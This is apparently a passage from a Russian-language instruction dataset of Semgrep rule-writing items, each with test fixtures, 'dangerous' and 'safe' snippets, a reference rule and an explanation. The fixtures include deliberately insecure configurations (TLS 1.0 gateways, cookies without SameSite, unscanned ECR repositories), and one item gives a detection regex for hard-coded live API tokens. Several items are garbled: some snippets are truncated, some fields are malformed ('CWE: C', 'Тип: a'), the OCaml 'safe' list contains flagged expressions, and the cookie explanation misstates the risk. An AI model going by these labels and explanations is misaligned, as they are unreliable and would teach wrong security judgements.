extends React.Component {\n  state = {\n    value: ''\n  };\n// ruleid: react-legacy-component\n  componentWillUpdate(nextProps, nextState) {\n    this.setState({ value: nextProps.value });\n  }\n\n\nБезопасные паттерны:  \n• class OkComponent1 extends Component {\n// ok: react-legacy-component\n  componentDidMount() {\n    this.node.scrollIntoView();\n  }\n\n  render() {\n    return <div ref={node => this.node = node} />\n  }\n}\n• class Test1 extends React.Component {\n  state = {\n    value: ''\n  };\n  handleChange = (e) => {\n    this.setState({ value: e.target.value });\n  }\n  render() {\n    return (\n      <input\n        value={t\n\nЛегенда аннотаций:\n- // ruleid:react-legacy-component: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:react-legacy-component: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: react-legacy-component\n    patterns:\n      - pattern: |\n          $METHOD(...) {\n            ...\n          }\n      - metavariable-regex:\n          metavariable: $METHOD\n          regex: componentWillMount|componentWillReceiveProps|componentWillUpdate\n    message: >-\n      Legacy component lifecycle was detected - $METHOD.\n    languages:\n      - typescript\n      - javascript\n    severity: WARNING\n    metadata:\n      category: best-practice\n      technology:\n        - react\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования устаревших жизненного цикла компонентов React ($METHOD), таких как 'componentWillMount', 'componentWillReceiveProps' и 'componentWillUpdate'. Анализ выполняется путем сопоставления шаблонов функций с метапеременными и регулярными выражениями. Правило применимо к TypeScript и JavaScript коду и выдает предупреждение при обнаружении опасных методов.\n\n# Ключевые элементы:\n- ID: react-legacy-component\n- Язык: typescript \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "react-legacy-component",
      "language": "typescript",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: metadata-incorrect-option\nОписание уязвимости: It looks like $KEY is not in the default list of expected options, if this is a new key update this rule\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: metadata-incorrect-option.test.yaml\nrules:\n  - id: swift-user-defaults\n    message: Potentially sensitive data was observed to be stored in UserDefaults,\n      which is not adequate protection of sensitive information. For data of a\n      sensitive nature, applications should leverage the Keychain.\n    severity: WARNING\n    metadata:\n      likelihood: LOW\n      impact: HIGH\n      confidence: MEDIUM\n      category: security\n      cwe:\n        - \"CWE-311: Missing Encryption of Sensitive Data\"\n      masvs:\n        - \"MASVS-STORAGE-1: The app securely stores sensitive data\"\n      owasp:\n        - A03:2017 - Sensitive Data Exposure\n        - A04:2021 - Insecure Design\n      references:\n        - https://developer.apple.com/library/archive/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html\n        - https://mas.owasp.org/MASVS/controls/MASVS-STORAGE-1/\n      subcategory:\n        - vuln\n      technology:\n        - ios\n        - macos\n      license: Commons Clause License Condition v1.0[LGPL-2.1-only]\n      vulnerability_class:\n        - Cryptographic Issues\n    languages:\n      - swift\n    options:\n      # ruleid: metadata-incorrect-option\n      taint_propagation: true\n      # ruleid: metadata-incorrect-option\n      value: 2\n    patterns:  # Ограничиваем длину\n\nОпасные паттерны:\n• rules:\n  - id: test\n    options:\n      foo: bar\n      baz: qux\n      quux: corge\n      unknown_key: value\n\n• rules:\n  - id: test\n    options:\n      constant_propagation: true\n      symbolic_propagation: false\n      unknown_key: value\n\n• rules:\n  - id: test\n    options:\n      ac_matching: true\n      unknown_key: value\n\n\nБезопасные паттерны:  \n• rules:\n  - id: test\n    options:\n      foo: bar\n      baz: qux\n      quux: corge\n\n• rules:\n  - id: test\n    options:\n      constant_propagation: true\n      symbolic_propagation: false\n\n• rules:\n  - id: test\n    options:\n      ac_matching: true\n\nЛегенда аннотаций:\n- // ruleid:metadata-incorrect-option: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:metadata-incorrect-option: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: metadata-incorrect-option\n  message: >-\n    It looks like $KEY is not in the default list of expected options, if this is a new key update this\n    rule\n  severity: INFO\n  metadata:\n    category: correctness\n    references:\n    - https://semgrep.dev/docs/contributing/contributing-to-semgrep-rules-repository\n    technology:\n    - semgrep\n  languages:\n  - yaml\n  patterns:\n  - pattern-inside: |\n      rules: ...\n  - pattern-inside: |\n      options:\n        $A\n  - focus-metavariable: $A\n  - pattern: |\n      $KEY: $VALUE\n  - metavariable-regex:\n      metavariable: $KEY\n      regex: \n        (?!options|constant_propagation|symbolic_propagation|taint_unify_mvars|taint_assume_safe_functions|taint_assume_safe_indexes|taint_assume_safe_comparisons|taint_assume_safe_booleans|taint_assume_safe_numbers|ac_matching|commutative_boolop|flddef_assign|arrow_is_function|let_is_var|go_deeper_expr|go_deeper_stmt|implicit_deep_exprstmt|implicit_ellipsis|xml_singleton_loose_matching|xml_attrs_implicit_ellipsis|xml_children_ordered|generic_engine|generic_multiline|generic_braces|generic_extra_braces|generic_extra_word_characters|generic_caseless|generic_ellipsis_max_span|generic_comment_style|interfile|generic_engine|commutative_compop|symmetric_eq|taint_only_propagate_through_assignments|taint_match_on|taint_focus_on)\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ключей ($KEY) в YAML-файле, которые не указаны в списке ожидаемых опций ($A). Если обнаружен неизвестный ключ, это может указывать на некорректное использование метаданных или отсутствие обновления правила при введении нового ключа. Правило использует pattern-inside для поиска блоков 'rules:' и 'options:', затем фокусируется на переменной $A и проверяет наличие ключа $KEY внутри этих блоков.\n\n# Ключевые элементы:\n- ID: metadata-incorrect-option\n- Язык: yaml \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "metadata-incorrect-option",
      "language": "yaml",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: detected-onfido-live-api-token\nОписание уязвимости: Onfido live API Token detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-onfido-live-api-token.txt\n# ruleid: detected-onfido-live-api-token\napi_live.abc123ABC-_.abc123ABC-_abc123ABC-_abc123ABC-\n\n# ruleid: detected-onfido-live-api-token\napi_live_ca.abc123ABC-_.abc123ABC-_abc123ABC-_abc123ABC-\n\n# ruleid: detected-onfido-live-api-token\napi_live_us.abc123ABC-_.abc123ABC-_abc123ABC-_abc123ABC-  # Ограничиваем длину\n\nОпасные паттерны:\n• api_live.abc123ABC-_.abc123ABC-_abc123ABC-_abc123ABC-\n• api_live_ca.abc123ABC-_.abc123ABC-_abc123ABC-_abc123ABC-\n• api_live_us.abc123ABC-_.abc123ABC-_abc123ABC-_abc123ABC-\n\nБезопасные паттерны:  \n• var = 'api_live_token';\n• const token = 'valid_token';\n• let apiKey = 'secure_api_key';\n\nЛегенда аннотаций:\n- // ruleid:detected-onfido-live-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-onfido-live-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-onfido-live-api-token\n  pattern-regex: (?:api_live(?:_[a-zA-Z]{2})?\\.[a-zA-Z0-9-_]{11}\\.[-_a-zA-Z0-9]{32})\n  languages: [regex]\n  message: Onfido live API Token detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    category: security\n    technology:\n    - secrets\n    - onfido\n    confidence: HIGH\n    references:\n    - https://documentation.onfido.com/api/latest/#api-tokens\n    subcategory:\n    - audit\n    likelihood: HIGH\n    impact: HIGH\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, которые могут представлять жестко закодированный токен Onfido Live API. Паттерн ищет последовательность, начинающуюся с 'api_live', за которой следует необязательный двухбуквенный код страны, затем точная комбинация из 11 буквенно-цифровых символов и дефисов, после чего идет случайная строка длиной 32 символа, содержащая буквы, цифры и символы дефиса и подчеркивания. Правило применяет поисковый тип анализа и настроено для языка регулярных выражений.\n\n# Ключевые элементы:\n- ID: detected-onfido-live-api-token\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-onfido-live-api-token",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: args\nОписание уязвимости: args should not be used for security operations. From the docs: \"The first element is traditionally the path of the executable, but it can be set to arbitrary text, and might not even exist. This means this property should not be relied upon for security purposes.\"\nCWE: C\nТип анализа: search\nЯзык: rust",
    "input": "Требования:\n- Язык: rust\n- Тип анализа: search\n- CWE: C\n- Серьезность: INFO\n\nКонтекст кода:\n// File: args.rs\nuse std::env;\n\n// ruleid: args\nlet args = env::args();  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: args_dangerous.rs\\nuse std::env;\\n\\n// ruleid: args\\nlet args = env::args();\\nlet first_arg = args.next().unwrap();\\nif first_arg == \\\n•  { ... }\n• // File: args_dangerous.rs\\nuse std::env;\\n\\n// ruleid: args\\nlet args = env::args();\\nlet admin_flag = args.contains(\\\n\nБезопасные паттерны:  \n• // File: args_safe.rs\\nuse std::env;\\n\\n// safe: args\\nlet args = env::args();\\nfor arg in args { println!(\n• , arg); }\n• // File: args_safe.rs\\nuse std::env;\\n\\n// safe: args\\nlet args = env::args();\\nalert(&args.collect::<Vec<_>>());\n\nЛегенда аннотаций:\n- // ruleid:args: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:args: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: args\n    message: >-\n      args should not be used for security operations. From the docs:\n      \"The first element is traditionally the path of the executable, but it\n      can be set to arbitrary text, and might not even exist. This means this\n      property should not be relied upon for security purposes.\"\n    pattern: \"std::env::args()\"\n    metadata:\n      references:\n        - https://doc.rust-lang.org/stable/std/env/fn.args.html\n      technology:\n        - rust\n      category: security\n      cwe: \"CWE-807: Reliance on Untrusted Inputs in a Security Decision\"\n      confidence: HIGH\n      likelihood: LOW\n      impact: LOW\n      subcategory: audit\n    languages: [rust]\n    severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции env::args() в Rust-коде. Функция env::args() возвращает итератор над аргументами командной строки, которые могут быть установлены пользователем произвольным образом. Это делает их ненадежными для применения в операциях безопасности, так как первый элемент обычно является путем исполняемого файла, но может быть изменен или даже не существовать. Правило ищет прямое применение env::args() без дополнительного фильтрации или проверки.\n\n# Ключевые элементы:\n- ID: args\n- Язык: rust \n- Тип: a\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "args",
      "language": "rust",
      "severity": "INFO",
      "rule_type": "a",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: aws-insecure-api-gateway-tls-version\nОписание уязвимости: Detected AWS API Gateway to be using an insecure version of TLS. To fix this issue make sure to set \"security_policy\" equal to \"TLS_1_2\".\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: terraform",
    "input": "Требования:\n- Язык: terraform\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-insecure-api-gateway-tls-version.tf\n# ruleid: aws-insecure-api-gateway-tls-version\nresource \"aws_api_gateway_domain_name\" \"badCode\" {\n  domain_name = \"api.badCode.com\"\n  security_policy = \"TLS_1_0\"\n}\n\n# ruleid: aws-insecure-api-gateway-tls-version\nresource \"aws_apigatewayv2_domain_name\" \"badCode\" {\n  domain_name = \"api.badCode.com\"\n  domain_name_configuration {}\n}\n\n# ok: aws-insecure-api-gateway-tls-version\nresource \"aws_api_gateway_domain_name\" \"okCode\" {\n  domain_name = \"api.okCode.com\"\n  security_policy = \"TLS_1_2\"\n}\n\n# ok: aws-insecure-api-gateway-tls-version\nresource \"aws_apigatewayv2_domain_name\" \"okCode\" {\n  domain_name = \"api.okCode.com\"\n  domain_name_configuration {\n    security_policy = \"TLS_1_2\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_api_gateway_domain_name\" \"badCode\" { \r\n  domain_name = \"api.badCode.com\"\r\n  security_policy = \"TLS_1_0\"\r\n}\n• resource \"aws_apigatewayv2_domain_name\" \"badCode\" { \r\n  domain_name = \"api.badCode.com\"\r\n  domain_name_configuration {}\r\n}\n\nБезопасные паттерны:  \n• resource \"aws_api_gateway_domain_name\" \"okCode\" { \r\n  domain_name = \"api.okCode.com\"\r\n  security_policy = \"TLS_1_2\"\r\n}\n• resource \"aws_apigatewayv2_domain_name\" \"okCode\" { \r\n  domain_name = \"api.okCode.com\"\r\n  domain_name_configuration { \r\n      security_policy = \"TLS_1_2\"\r\n  }\r\n}\n\nЛегенда аннотаций:\n- // ruleid:aws-insecure-api-gateway-tls-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-insecure-api-gateway-tls-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-insecure-api-gateway-tls-version\n  patterns:\n  - pattern-either:\n    - pattern: |\n        resource \"aws_api_gateway_domain_name\" $ANYTHING {\n            ...\n            security_policy = \"...\"\n            ...\n        }\n    - pattern: |\n        resource \"aws_apigatewayv2_domain_name\" $ANYTHING {\n            ...\n            domain_name_configuration {...}\n            ...\n        }\n  - pattern-not: |\n      resource \"aws_api_gateway_domain_name\" $ANYTHING {\n              ...\n              security_policy = \"TLS_1_2\"\n              ...\n          }\n  - pattern-not: |\n      resource \"aws_apigatewayv2_domain_name\" $ANYTHING {\n              ...\n              domain_name_configuration {\n                  ...\n                  security_policy = \"TLS_1_2\"\n                  ...\n              }\n          }\n  message: Detected AWS API Gateway to be using an insecure version of TLS. To fix this issue make sure\n    to set \"security_policy\" equal to \"TLS_1_2\".\n  languages:\n  - terraform\n  severity: WARNING\n  metadata:\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    category: security\n    technology:\n    - aws\n    - terraform\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS API Gateway Domain Name и AWS API Gateway V2 Domain Name, где параметр security_policy или domain_name_configuration.security_policy установлен в значение 'TLS_1_0'. Правило использует шаблон pattern-either для охвата обоих типов ресурсов и два шаблона pattern-not для исключения случаев, когда security_policy или domain_name_configuration.security_policy установлены в 'TLS_1_2'. Это позволяет обнаружить потенциально небезопасное использование TLS версии 1.0 и предложить исправление путем установки параметра security_policy равным 'TLS_1_2'.\n\n# Ключевые элементы:\n- ID: aws-insecure-api-gateway-tls-version\n- Язык: terraform \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-insecure-api-gateway-tls-version",
      "language": "terraform",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: pyramid-set-cookie-samesite-unsafe-default\nОписание уязвимости: Found a Pyramid cookie using an unsafe value for the samesite option. Pyramid cookies should be handled securely by setting samesite='Lax' in response.set_cookie(...). If this parameter is not properly set, your cookies are not properly protected and are at risk of being stolen by an attacker.\nCWE: CWE-1275: Sensitive Cookie with Improper SameSite Attribute\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-1275: Sensitive Cookie with Improper SameSite Attribute\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: set-cookie-samesite-unsafe-default.py\nfrom pyramid import httpexceptions as exc\nfrom pyramid.view import view_config\n\n### True positives ###\n\n\n@view_config(route_name='my_view')\ndef my_bad_view3(request):\n    response = request.response\n    # ruleid: pyramid-set-cookie-samesite-unsafe-default\n    response.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n                        secure=True, httponly=True)\n    return {'foo': 'bar'}\n\n\n@view_config(route_name='my_view')\ndef my_bad_view4(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ruleid: pyramid-set-cookie-samesite-unsafe-default\n    resp.set_cookie('MY_COOKIE', secure=True, httponly=True)\n    return resp\n\n\n### True negatives ###\n\n@view_config(route_name='my_view')\ndef my_good_view1(request):\n    response = request.response\n    # ok: pyramid-set-cookie-samesite-unsafe-default\n    response.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n                        secure=True, httponly=True, samesite='Lax')\n    return {'foo': 'bar'}\n\n\n@view_config(route_name='my_view')\ndef my_good_view3(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-samesite-unsafe-default\n    resp.set_cookie('MY_COOKIE', secure=True, httponly=True, samesite='Lax')\n    return resp\n\n\n@view_config(route_name='my_view')\ndef my_good_view4(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-samesite-unsafe-default\n    resp.set_cookie('MY_COOKIE', **global_cookie_flags)\n    return resp  # Ограничиваем длину\n\nОпасные паттерны:\n• @view_config(route_name='my_view')\ndef my_bad_view3(request):\n    response = request.response\n    # ruleid: pyramid-set-cookie-samesite-unsafe-default\n    response.set_cookie('MY_COOKIE', value='MY_CO\n• @view_config(route_name='my_view')\ndef my_bad_view4(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ruleid: pyramid-set-cookie-samesite-unsafe-default\n   \n\nБезопасные паттерны:  \n• @view_config(route_name='my_view')\ndef my_good_view1(request):\n    response = request.response\n    # ok: pyramid-set-cookie-samesite-unsafe-default\n    response.set_cookie('MY_COOKIE', value='MY_COOKI\n• @view_config(route_name='my_view')\ndef my_good_view3(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-samesite-unsafe-default\n    re\n\nЛегенда аннотаций:\n- // ruleid:pyramid-set-cookie-samesite-unsafe-default: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pyramid-set-cookie-samesite-unsafe-default: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pyramid-set-cookie-samesite-unsafe-default\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        @pyramid.view.view_config(...)\n        def $VIEW($REQUEST):\n            ...\n            $RESPONSE = $REQUEST.response\n            ...\n    - pattern-inside: |\n        def $VIEW(...):\n            ...\n            $RESPONSE = pyramid.httpexceptions.HTTPFound(...)\n            ...\n  - pattern-not: $RESPONSE.set_cookie(..., samesite=$SAMESITE, ...)\n  - pattern-not: $RESPONSE.set_cookie(..., **$PARAMS)\n  - pattern: $RESPONSE.set_cookie(...)\n  fix-regex:\n    regex: (.*)\\)\n    replacement: \\1, samesite='Lax')\n  message: >-\n    Found a Pyramid cookie using an unsafe value for the samesite option.\n    Pyramid cookies should be handled securely by setting samesite='Lax' in response.set_cookie(...).\n    If this parameter is not properly set, your cookies are not properly protected and\n    are at risk of being stolen by an attacker.\n  metadata:\n    cwe:\n    - 'CWE-1275: Sensitive Cookie with Improper SameSite Attribute'\n    owasp:\n    - A01:2021 - Broken Access Control\n    category: security\n    technology:\n    - pyramid\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции set_cookie в библиотеке Pyramid без указания параметра samesite. В Python, при вызове set_cookie без явного указания samesite, значение по умолчанию может быть незащищенным ('None'), что делает cookie уязвимым для атак man-in-the-middle. Правило использует шаблон inside для нахождения контекста вызова view_config или HTTPFound, затем проверяет отсутствие явного указания samesite и наличие обязательных параметров secure и httponly. Если эти условия выполняются, генерируется предупреждение о потенциальной уязвимости.\n\n# Ключевые элементы:\n- ID: pyramid-set-cookie-samesite-unsafe-default\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pyramid-set-cookie-samesite-unsafe-default",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: ecr-image-scan-on-push\nОписание уязвимости: The ECR Repository isn't configured to scan images on push\nCWE: CWE-1104: Use of Unmaintained Third Party Components\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1104: Use of Unmaintained Third Party Components\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: ecr-image-scan-on-push.tf\nresource \"aws_ecr_repository\" \"foo\" {\n  name                 = \"test-repository\"\n  image_tag_mutability = \"MUTABLE\"\n  image_scanning_configuration {\n    scan_on_push = true\n  }\n}\n\n# ruleid: ecr-image-scan-on-push\nresource \"aws_ecr_repository\" \"foo\" {\n  name                 = \"test-repository\"\n  image_tag_mutability = \"MUTABLE\"\n  image_scanning_configuration {\n    scan_on_push = false\n  }\n}\n\n# ruleid: ecr-image-scan-on-push\nresource \"aws_ecr_repository\" \"repository\" {\n  name                 = \"test-repository\"\n  image_tag_mutability = \"MUTABLE\"\n  tags = {\n    Name = \"test-repository\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_ecr_repository\" \"foo\" { \n  name = \"test-repository\"\n  image_tag_mutability = \"MUTABLE\"\n  image_scanning_configuration {\n    scan_on_push = false\n  }\n}\n• resource \"aws_ecr_repository\" \"repository\" { \n  name = \"test-repository\"\n  image_tag_mutability = \"MUTABLE\"\n  tags = {\n    Name = \"test-repository\"\n  } \n}\n\nБезопасные паттерны:  \n• resource \"aws_ecr_repository\" \"foo\" { \n  name = \"test-repository\"\n  image_tag_mutability = \"MUTABLE\"\n  image_scanning_configuration {\n    scan_on_push = true\n  }\n}\n\nЛегенда аннотаций:\n- // ruleid:ecr-image-scan-on-push: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ecr-image-scan-on-push: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ecr-image-scan-on-push\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"aws_ecr_repository\" \"...\" {\n        ...\n        image_scanning_configuration {\n          ...\n          scan_on_push=true\n          ...\n        }\n        ...\n      }\n  - pattern-inside: |\n      resource \"aws_ecr_repository\" \"...\" {\n        ...\n      }\n  languages:\n  - hcl\n  message: >-\n    The ECR Repository isn't configured to scan images on push\n  severity: WARNING\n  metadata:\n    cwe:\n    - 'CWE-1104: Use of Unmaintained Third Party Components'\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A06:2021 - Vulnerable and Outdated Components\n    references:\n    - https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS ECR (Amazon Elastic Container Registry) репозитория, которые не настроены на сканирование образов при их публикации. Анализ выполняется путем поиска шаблона ресурса AWS ECR repository, который не содержит внутри себя блок конфигурации image_scanning_configuration с параметром scan_on_push равным true. Внешний шаблон используется для исключения случаев, когда ресурс полностью соответствует требуемому формату с правильным значением scan_on_push.\n\n# Ключевые элементы:\n- ID: ecr-image-scan-on-push\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ecr-image-scan-on-push",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: ocamllint-bool-true\nОписание уязвимости: Comparison to boolean. Just use `$X`\nCWE: \nТип анализа: search\nЯзык: ocaml",
    "input": "Требования:\n- Язык: ocaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: bool.ml\nlet test a =\n  (* ruleid:ocamllint-bool-true *)\n  let x = a = true in\n  (* ruleid:ocamllint-bool-true *)\n  let x = a == true in\n  (* ruleid:ocamllint-bool-false *)\n  let x = a = false in\n  (* ruleid:ocamllint-bool-false *)\n  let x = a == false in\n  (* ruleid:ocamllint-bool-true *)\n  let x = a != false in\n  (* ruleid:ocamllint-bool-false *)\n  let x = a <> true in\n  ()  # Ограничиваем длину\n\nОпасные паттерны:\n• let x = a = true in\n• let x = a == true in\n• let x = a != false in\n\nБезопасные паттерны:  \n• let x = not a in\n• let x = a = false in\n• let x = a == false in\n\nЛегенда аннотаций:\n- // ruleid:ocamllint-bool-true: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ocamllint-bool-true: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: ocamllint-bool-true\n    pattern-either:\n      - pattern: $X = true\n      - pattern: $X == true\n      - pattern: $X != false\n    message: Comparison to boolean. Just use `$X`\n    languages: [ocaml]\n    severity: WARNING\n    metadata:\n      category: best-practice\n      technology:\n        - ocaml\n  - id: ocamllint-bool-false\n    pattern-either:\n      - pattern: $X = false\n      - pattern: $X == false\n      - pattern: $X <> true\n    message: Comparison to boolean. Just use `not $X`\n    languages: [ocaml]\n    severity: WARNING\n    metadata:\n      category: best-practice\n      technology:\n        - ocaml\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска сравнений переменных с булевыми значениями 'true' или 'false'. Оно использует шаблон сопоставления, который ищет выражения вида '$X = true', '$X == true', '$X != false' и '$X = false', '$X == false', '$X <> true'. Правило применимо только к языку Ocaml и выдает предупреждение при обнаружении таких конструкций, рекомендуя использовать более явную запись сравнения через отрицание переменной.\n\n# Ключевые элементы:\n- ID: ocamllint-bool-true\n- Язык: ocaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ocamllint-bool-true",
      "language": "ocaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: azure-appservice-python-version\nОписание уязвимости: Ensure that Python version is the latest, if used to run the web app\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: azure-appservice-python-version.tf\n# fail\n# ruleid: azure-appservice-python-version\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  site_config {\n    python_version = \"2.7\"\n    scm_type                 = \"someValue\"\n  }\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  site_config {\n    python_version = \"3.10\"\n    scm_type                 = \"someValue\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n\nБезопасные паттерны:  \n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-python-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-python-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-appservice-python-version\n    message: >-\n      Ensure that Python version is the latest, if used to run the web app\n    patterns:\n      - pattern: resource\n      - pattern-not-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          site_config {\n            ...\n            python_version = \"3.10\"\n            ...\n          }\n          ...\n          }\n      - pattern-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования устаревших версий Python в ресурсах Azure App Service. Анализ выполняется путем поиска шаблона ресурса Azure App Service и исключения случаев, где явно указана версия Python 3.10 или выше. Правило использует оператор NOT INSIDE для игнорирования ресурсов, содержащих указанную версию Python 3.10, и оператор INSIDE для включения всех остальных ресурсов.\n\n# Ключевые элементы:\n- ID: azure-appservice-python-version\n- Язык: hcl \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "azure-appservice-python-version",
      "language": "hcl",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
